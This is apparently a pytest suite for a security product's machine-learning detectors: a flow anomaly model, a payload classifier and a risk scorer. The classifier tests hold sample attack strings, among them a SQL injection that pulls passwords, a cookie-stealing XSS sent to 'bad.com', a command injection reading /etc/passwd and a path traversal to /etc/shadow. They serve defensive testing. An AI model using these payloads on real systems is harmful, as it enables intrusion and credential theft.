"""
CyberShield Enterprise - ML Datasets & Detection Models Automated Test Suite
Validates synthetic dataset generation, Isolation Forest flow anomaly scoring,
TF-IDF multi-class payload attack classification, and Bayesian risk scoring.
"""

import os
import pytest
import pytest_asyncio
import tempfile

from cybershield.ml.datasets.generator import SecurityDatasetGenerator
from cybershield.ml.datasets.manager import DatasetManager
from cybershield.ml.engines.isolation_forest import IsolationForestEngine
from cybershield.ml.engines.payload_classifier import PayloadClassifierEngine
from cybershield.ml.engines.risk_predictor import RiskPredictorEngine


def test_synthetic_dataset_generation():
    """Verify reproducible synthetic dataset generation for NetFlow and web payloads."""
    # 1. NetFlow dataset
    netflow_data = SecurityDatasetGenerator.generate_netflow_dataset(n_samples=200, anomaly_ratio=0.2)
    assert len(netflow_data) == 200
    sample = netflow_data[0]
    for key in ["packet_count", "byte_count", "duration_sec", "dst_port", "bytes_out_ratio", "is_off_hours", "is_anomaly"]:
        assert key in sample

    anomalies = [r for r in netflow_data if r["is_anomaly"] == 1]
    assert len(anomalies) == 40

    # 2. Payload dataset
    payload_data = SecurityDatasetGenerator.generate_payload_dataset(n_samples=250)
    assert len(payload_data) == 250
    classes = set(p[1] for p in payload_data)
    assert "BENIGN" in classes
    assert "SQL_INJECTION" in classes
    assert "CROSS_SITE_SCRIPTING" in classes
    assert "COMMAND_INJECTION" in classes
    assert "PATH_TRAVERSAL" in classes


def test_dataset_manager_catalog():
    """Verify local dataset manager registration, listing, and retrieval."""
    dm = DatasetManager(storage_dir=tempfile.mkdtemp())
    datasets = dm.list_datasets()
    assert len(datasets) >= 2

    # Create new custom dataset
    created = dm.create_dataset("test_payloads_custom", "PAYLOADS", n_samples=100)
    assert created["name"] == "test_payloads_custom"
    assert created["samples_count"] == 100

    fetched = dm.get_dataset_data("test_payloads_custom")
    assert fetched is not None
    assert len(fetched) == 100


def test_isolation_forest_anomaly_detection():
    """Verify Scikit-Learn Isolation Forest training and scoring on normal vs anomalous flows."""
    engine = IsolationForestEngine(contamination=0.1, n_estimators=50)
    synth = SecurityDatasetGenerator.generate_netflow_dataset(n_samples=400)
    metrics = engine.fit(synth)

    assert engine.is_trained is True
    assert metrics["samples_trained"] == 400
    assert metrics["features_count"] == 6

    # Normal web browsing flow
    normal_flow = {
        "packet_count": 25,
        "byte_count": 18000,
        "duration_sec": 2.5,
        "dst_port": 443,
        "bytes_out_ratio": 0.35,
        "is_off_hours": False,
    }
    res_normal = engine.predict(normal_flow)
    assert res_normal["is_anomaly"] is False
    assert res_normal["classification"] == "NORMAL"
    assert res_normal["risk_score"] < 50.0

    # Extreme Data Exfiltration anomaly
    exfil_flow = {
        "packet_count": 85000,
        "byte_count": 120000000,  # 120 MB
        "duration_sec": 300.0,
        "dst_port": 9001,
        "bytes_out_ratio": 0.99,
        "is_off_hours": True,
    }
    res_anomaly = engine.predict(exfil_flow)
    assert res_anomaly["is_anomaly"] is True
    assert res_anomaly["risk_score"] >= 50.0
    assert "exfiltration" in res_anomaly["explanation"].lower() or "burst" in res_anomaly["explanation"].lower() or "off-hours" in res_anomaly["explanation"].lower()


def test_payload_classifier_multiclass():
    """Verify TF-IDF + Naive Bayes payload classification across all 5 attack vectors."""
    engine = PayloadClassifierEngine(max_features=1000)
    synth = SecurityDatasetGenerator.generate_payload_dataset(n_samples=500)
    metrics = engine.fit(synth)

    assert engine.is_trained is True
    assert metrics["accuracy"] >= 0.85
    assert metrics["weighted_f1"] >= 0.85

    # Test SQL Injection
    sqli_res = engine.predict("' UNION SELECT null, username, password FROM users --")
    assert sqli_res["predicted_class"] == "SQL_INJECTION"
    assert sqli_res["confidence"] > 0.5
    assert sqli_res["risk_level"] in ("HIGH", "CRITICAL")
    assert len(sqli_res["matched_indicators"]) >= 1

    # Test XSS
    xss_res = engine.predict("<script>document.location='http://bad.com/'+document.cookie</script>")
    assert xss_res["predicted_class"] == "CROSS_SITE_SCRIPTING"
    assert xss_res["confidence"] > 0.5

    # Test Command Injection
    cmd_res = engine.predict("127.0.0.1; cat /etc/passwd")
    assert cmd_res["predicted_class"] == "COMMAND_INJECTION"
    assert cmd_res["confidence"] > 0.5

    # Test Path Traversal
    path_res = engine.predict("../../../../etc/shadow")
    assert path_res["predicted_class"] == "PATH_TRAVERSAL"
    assert path_res["confidence"] > 0.5

    # Test Benign
    benign_res = engine.predict("search?q=cybersecurity&page=2")
    assert benign_res["predicted_class"] == "BENIGN"
    assert benign_res["risk_level"] == "CLEAN"


def test_bayesian_risk_predictor():
    """Verify Bayesian multi-factor entity risk scoring and factor attribution."""
    # Low-risk workstation
    low_risk = RiskPredictorEngine.calculate_entity_risk(
        max_cvss_score=0.0,
        active_alert_count=0,
        open_ports=[80],
        is_critical_asset=False,
    )
    assert low_risk["risk_score"] < 25.0
    assert low_risk["risk_tier"] == "LOW"
    assert low_risk["requires_containment"] is False

    # Critical compromised server with SMB open, ZeroLogon CVE, and active alerts
    high_risk = RiskPredictorEngine.calculate_entity_risk(
        max_cvss_score=10.0,
        active_alert_count=8,
        open_ports=[445, 3389],
        is_critical_asset=True,
        active_exploit_observed=True,
        ueba_anomaly_score=85.0,
    )
    assert high_risk["risk_score"] >= 80.0
    assert high_risk["risk_tier"] == "CRITICAL"
    assert high_risk["requires_containment"] is True
    assert high_risk["factor_breakdown"]["vulnerability_cvss"] > 30.0


def test_model_serialization_and_persistence(tmp_path):
    """Verify checkpoint saving and reloading for Isolation Forest and Payload Classifier."""
    # 1. Isolation Forest
    if_engine = IsolationForestEngine()
    synth_flow = SecurityDatasetGenerator.generate_netflow_dataset(n_samples=200)
    if_engine.fit(synth_flow)

    if_file = str(tmp_path / "iforest_test.pkl")
    if_engine.save(if_file)
    assert os.path.exists(if_file)

    reloaded_if = IsolationForestEngine()
    reloaded_if.load(if_file)
    assert reloaded_if.is_trained is True

    test_flow = {"packet_count": 50, "byte_count": 20000, "duration_sec": 1.0, "dst_port": 80, "bytes_out_ratio": 0.5, "is_off_hours": False}
    pred = reloaded_if.predict(test_flow)
    assert "is_anomaly" in pred

    # 2. Payload Classifier
    clf_engine = PayloadClassifierEngine()
    synth_pay = SecurityDatasetGenerator.generate_payload_dataset(n_samples=200)
    clf_engine.fit(synth_pay)

    clf_file = str(tmp_path / "clf_test.pkl")
    clf_engine.save(clf_file)
    assert os.path.exists(clf_file)

    reloaded_clf = PayloadClassifierEngine()
    reloaded_clf.load(clf_file)
    assert reloaded_clf.is_trained is True
    pred_clf = reloaded_clf.predict("' OR 1=1 --")
    assert pred_clf["predicted_class"] == "SQL_INJECTION"
